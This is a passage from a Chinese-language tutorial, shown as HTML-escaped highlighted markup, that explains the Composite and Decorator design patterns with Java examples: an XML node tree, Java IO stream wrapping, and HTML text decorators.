&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">UnsupportedOperationException&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 无法增加子节点
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">children&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toXml&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>还可以有注释节点：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommentNode&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">CommentNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">UnsupportedOperationException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">children&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toXml&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;!-- &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; --&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过ElementNode, TextNode, CommentNode我们就可以构造出一棵树&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Node&lt;/span> &lt;span style="color:#111">root&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ElementNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;school&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">root&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ElementNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;classA&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TextNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Tom&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TextNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Alice&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">root&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ElementNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;classB&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TextNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TextNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Grace&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CommentNode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;comment...&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">root&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toXml&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>综上，组合模式需要先统一单个节点以及容器节点的接口&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903000328506.png" alt="image-20220903000328506">&lt;/p>
&lt;p>作为容器节点的ElementNode又可以添加任意个Node，这样就可以构成层级结构&lt;/p>
&lt;p>类似的，像文件夹和文件、GUI窗口的各种组件，都符合Composite模式的定义，因为它们的结构天生就是层级结构&lt;/p>
&lt;h3 id="装饰器decorator">装饰器Decorator&lt;/h3>
&lt;p>Decorator是一种在运行期动态给某个对象的实例增加功能的方法，在各个web应用里很常见，Decorator模式的目的就是把一个一个的附加功能，用Decorator的方式给一层一层地累加到原始数据源上，最终，通过组合获得我们想要的功能&lt;/p>
&lt;p>举例：给&lt;code>FileInputStream&lt;/code>增加缓冲和解压缩功能，用装饰器模式是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">fis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test.gz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">bis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fis&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">gis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">GZIPInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bis&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或一次性写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">GZIPInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">gz&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的&lt;code>BufferedInputStream&lt;/code>和&lt;code>GZIPInputStream&lt;/code>实际都是从&lt;code>FilterInputStream&lt;/code>继承而来的，这个&lt;code>FilterInputStream&lt;/code>就是一个抽象的Decorator&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903101312952.png" alt="image-20220903101312952">&lt;/p>
&lt;p>最顶层的Component是接口，对应到IO就是&lt;code>InputStream&lt;/code>这个抽象类，下面的AB&amp;hellip;是实际的子类，就是&lt;code>FileInputStream&lt;/code>和&lt;code>ServletInputStream&lt;/code>这些数据源；Decorator对应到IO就是&lt;code>FilterInputStream&lt;/code>，下面的AB&amp;hellip;就是&lt;code>BufferedInputStream&lt;/code>和&lt;code>GZIPInputStream&lt;/code>&lt;/p>
&lt;p>与桥接模式的区别在于装饰器模式下把核心功能和附加功能分开了，而不是桥接中的二者并行，虽然二者都是为了避免继承中可能出现的子类爆炸，但装饰器是对已经有的功能做修饰（最终产品可以不被修饰，也可以不断被嵌套），桥接是把并行的多个功能进行排列组合；比如这里的数据源和解压缩功能，如果我们要增加核心功能就增加Component的子类（比如&lt;code>ByteInputStream&lt;/code>），如果要增加附加功能，就增加Decorator的子类（比如&lt;code>CipherInputStream&lt;/code>），同时Decorator是继承自Component的；两部分可以独立扩展，具体如何附加功能由调用方自由组合，增强了灵活性&lt;/p>
&lt;p>举例：要渲染HTML文本，但是文本可以附加一些比如加粗、斜体之类的效果，我们可以使用装饰器模式&lt;/p>
&lt;p>首先还是之前组合模式下的，先定义顶层接口TextNode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">TextNode&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于核心节点，比如&lt;code>&amp;lt;span&amp;gt;&lt;/code>，直接继承&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SpanNode&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">TextNode&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;span&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/span&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>装饰器的部分，需要先有一个抽象的Decorator类（仍然继承自TextNode）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">NodeDecorator&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">TextNode&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">TextNode&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#75af00">NodeDecorator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TextNode&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">target&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个&lt;code>NodeDecorator&lt;/code>的核心是持有一个&lt;code>TextNode&lt;/code>，功能都会附加到这个&lt;code>TextNode&lt;/code>上；下面我们写一个加粗功能（继承自抽象装饰器）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BoldDecorator&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">NodeDecorator&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BoldDecorator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TextNode&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;b&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/b&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>类似的，可以继续添加&lt;code>ItalicDecorator&lt;/code>, &lt;code>UnderlineDecorator&lt;/code>等&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">TextNode&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SpanNode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">TextNode&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BoldDecorator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">UnderlineDecorator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SpanNode&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">TextNode&lt;/span> &lt;span style="color:#111">n3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ItalicDecorator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BoldDecorator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SpanNode&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Decorated&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setText&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;World&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;lt;span&amp;gt;Hello&amp;lt;/span&amp;gt;
